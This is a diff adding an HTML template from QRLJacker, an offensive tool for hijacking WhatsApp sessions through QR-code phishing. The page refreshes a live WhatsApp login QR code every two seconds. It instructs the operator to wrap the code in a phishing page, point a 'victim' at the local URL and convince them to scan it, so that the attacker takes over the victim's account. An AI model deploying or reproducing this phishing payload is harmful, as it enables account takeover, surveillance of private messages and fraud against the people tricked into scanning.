@@ -1,0 +1,30 @@
+<html>
+<head>
+<title>whatsapp</title>
+<script>
+var lastModified = 0;
+var myTimer = setInterval(reloadD, 2000);
+
+function reloadD() {
+  var img = document.getElementById('qrcodew');
+  img.src = "qrcode.png?" + new Date().getTime();
+  
+  if (img.complete && img.naturalWidth !== 0) {
+    if (img.lastModified > lastModified) {
+      lastModified = img.lastModified;
+      location.reload();
+    }
+  }
+}
+</script>
+</head>
+<body>
+<center><h1><b>QRLJacker: whatsapp</b></h1>
+Now you have a local webserver hosting your QRLJacking payload, Here's some instructions to be done:
+</br>1. This is your always updated whatsapp QR Code
+</b><img id="qrcodew" alt="Scan me!" src="qrcode.png" style="display: block;">
+</br>2. Edit phishing_page.html file by adding your phishing page source code, style, resources, etc.. (located inside framework in path core/templates/phishing_page.html)
+</br>3. Point your victim to your phishing <a href='http://localhost:4444/'>URL</a>, Convince to scan the QR code and Bob is your uncle!
+</center>
+</body>
+</html>
